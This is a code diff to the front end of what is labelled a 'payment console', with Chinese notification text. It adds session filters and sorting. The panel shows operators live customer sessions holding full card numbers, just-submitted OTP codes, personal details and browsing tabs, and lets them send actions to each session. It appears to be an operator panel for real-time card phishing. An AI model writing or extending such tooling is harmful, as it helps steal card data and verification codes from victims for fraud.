@@ -19,32 +19,58 @@ function playAudio(audio: HTMLAudioElement) {
 }
 
 var _onlyCardFilter = false;
-try { var _saved = JSON.parse(localStorage.getItem('payment_console_settings')||'{}'); _onlyCardFilter = !!_saved.onlyCardData } catch(e){}
+var _hideEmptyFilter = false;
+try { var _saved = JSON.parse(localStorage.getItem('payment_console_settings')||'{}'); _onlyCardFilter = !!_saved.onlyCardData; _hideEmptyFilter = !!_saved.hideEmptyClients } catch(e){}
 
 const hideBin = ref(false);
 const hidePhone = ref(false);
 const hideTabs = ref(false);
 const hideAddress = ref(false);
 
+function isEmptySession(s: any) {
+  const ci = s.cardInfo || {};
+  const ui = s.customerInfo || {};
+  return !ci.cardNumber && !ui.fullName && !ui.email && !ui.phone && !ui.address1 && !ui.city && !ui.country;
+}
+
+function sortSessions() {
+  sessions.sort((a, b) => {
+    const pinnedA = !!(a as any).pinned ? 1 : 0;
+    const pinnedB = !!(b as any).pinned ? 1 : 0;
+    if (pinnedB - pinnedA !== 0) return pinnedB - pinnedA;
+    return (b.sessionId || 0) - (a.sessionId || 0);
+  });
+}
+
+function applyFilters(list: Api.Payment.PaymentSession[], keepPin?: boolean) {
+  let result = list.filter(s => s.isOnline !== false);
+  if (_onlyCardFilter) result = result.filter(s => !!(s.cardInfo?.cardNumber));
+  if (_hideEmptyFilter) result = result.filter(s => !isEmptySession(s));
+  if (!keepPin) {
+    result.sort((a, b) => (b.sessionId || 0) - (a.sessionId || 0));
+  }
+  return result;
+}
+
 const { connected, sendAction, ws } = usePaymentWs({
   wsUrl: `${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}/api/`,
   operatorId: 'op_' + Date.now(),
   onSessionList: (list) => {
-    const filtered = (list as Api.Payment.PaymentSession[])
-      .filter(s => s.isOnline !== false)
-      .filter(s => !_onlyCardFilter || !!(s.cardInfo?.cardNumber));
+    const filtered = applyFilters(list as Api.Payment.PaymentSession[]);
     sessions.splice(0, sessions.length, ...filtered);
   },
   onSessionNew: (data) => {
     if (sessions.find(s => s.id === data.id)) return;
+    if (_onlyCardFilter && !(data as any).cardInfo?.cardNumber) return;
+    if (_hideEmptyFilter && isEmptySession(data)) return;
     playAudio(audioNew);
     window.$notification?.info({
       title: '新支付会话',
       content: `编号 ${(data as Api.Payment.PaymentSession).sessionId} - ${(data as Api.Payment.PaymentSession).customerInfo?.fullName || '未知用户'}`,
       duration: 4000
     });
-    if (_onlyCardFilter && !(data as any).cardInfo?.cardNumber) return;
-    sessions.unshift(data as Api.Payment.PaymentSession);
+    sessions.push(data as Api.Payment.PaymentSession);
+    sortSessions();
   },
   onSessionUpdate: (data) => {
     const idx = sessions.findIndex(s => s.id === data.sessionId);
@@ -53,7 +79,6 @@ const { connected, sendAction, ws } = usePaymentWs({
       const prevStatus = s.status;
 
       if (data.cardInfo) {
-        // Replace cardInfo entirely to trigger Vue reactivity
         s.cardInfo = { ...s.cardInfo, ...data.cardInfo };
       }
       if (data.customerInfo) s.customerInfo = { ...s.customerInfo, ...data.customerInfo };
@@ -93,7 +118,6 @@ const { connected, sendAction, ws } = usePaymentWs({
           });
         }
       } else if (data.cardInfo?.otpCode && s.cardInfo?.otpCode !== data.cardInfo.otpCode) {
-        // OTP submitted when already pending
         playNotification();
         window.$notification?.info({
           title: '📲 客户提交了验证码',
@@ -102,17 +126,17 @@ const { connected, sendAction, ws } = usePaymentWs({
         });
       }
     } else if (data.isOnline !== false && data.sessionId) {
-      // Session came back online but was filtered out on refresh — re-add it
-      if (!_onlyCardFilter || !!(data.cardInfo?.cardNumber)) {
-        sessions.unshift({
-          id: data.sessionId, sessionId: data.sessionId,
-          cardInfo: data.cardInfo || {}, customerInfo: data.customerInfo || {},
-          browsingTabs: data.browsingTabs || [], status: data.status || 'live',
-          currentStep: data.currentStep || 'card', frontendUrl: data.frontendUrl || '',
-          isOnline: true, countdownSeconds: 0, createdAt: '', updatedAt: '',
-          cardHistory: data.cardHistory || []
-        } as any);
-      }
+      if (_onlyCardFilter && !(data.cardInfo?.cardNumber)) return;
+      if (_hideEmptyFilter && isEmptySession(data)) return;
+      sessions.push({
+        id: data.sessionId, sessionId: data.sessionId,
+        cardInfo: data.cardInfo || {}, customerInfo: data.customerInfo || {},
+        browsingTabs: data.browsingTabs || [], status: data.status || 'live',
+        currentStep: data.currentStep || 'card', frontendUrl: data.frontendUrl || '',
+        isOnline: true, countdownSeconds: 0, createdAt: '', updatedAt: '',
+        cardHistory: data.cardHistory || []
+      } as any);
+      sortSessions();
     }
   },
   onSessionRemove: (sessionId: string) => {
@@ -147,21 +171,38 @@ function handleAction(action: Api.Payment.OperatorAction, sessionId: string, mes
 }
 
 function handleSettingsChanged(settings: any) {
+  const prevOnlyCard = _onlyCardFilter;
+  const prevHideEmpty = _hideEmptyFilter;
+
   _onlyCardFilter = !!settings.onlyCardData;
+  _hideEmptyFilter = !!settings.hideEmptyClients;
   hideBin.value = !!settings.hideBinFields;
   hidePhone.value = !!settings.hidePhoneField;
   hideTabs.value = !!settings.hideTabBar;
   hideAddress.value = !!settings.hideAddressBar;
-  // Apply filter immediately
-  if (_onlyCardFilter) {
+
+  // Apply filter: when enabling, remove from view; when disabling, re-fetch from server
+  if (_onlyCardFilter && !prevOnlyCard) {
     for (let i = sessions.length - 1; i >= 0; i--) {
       if (!sessions[i].cardInfo?.cardNumber) sessions.splice(i, 1);
     }
+  } else if (!_onlyCardFilter && prevOnlyCard) {
+    refreshSessions();
+    return;
   }
+
+  if (_hideEmptyFilter && !prevHideEmpty) {
+    for (let i = sessions.length - 1; i >= 0; i--) {
+      if (isEmptySession(sessions[i])) sessions.splice(i, 1);
+    }
+  } else if (!_hideEmptyFilter && prevHideEmpty) {
+    refreshSessions();
+    return;
+  }
+
   if (ws.value?.readyState === WebSocket.OPEN) {
     ws.value.send(JSON.stringify({ type: 'update_settings', payload: settings }));
   } else {
-    // retry after WS connected
     const retry = setInterval(() => {
       if (ws.value?.readyState === WebSocket.OPEN) {
         ws.value.send(JSON.stringify({ type: 'update_settings', payload: settings }));
@@ -177,8 +218,8 @@ async function refreshSessions() {
     const res = await fetch('/api/payment/sessions');
     const json = await res.json();
     if (json.code === '0000') {
-      const list = json.data.filter((s: any) => s.isOnline !== false);
-      sessions.splice(0, sessions.length, ...list);
+      const filtered = applyFilters(json.data);
+      sessions.splice(0, sessions.length, ...filtered);
       window.$message?.success('已刷新');
     }
   } catch { window.$message?.error('刷新失败') }
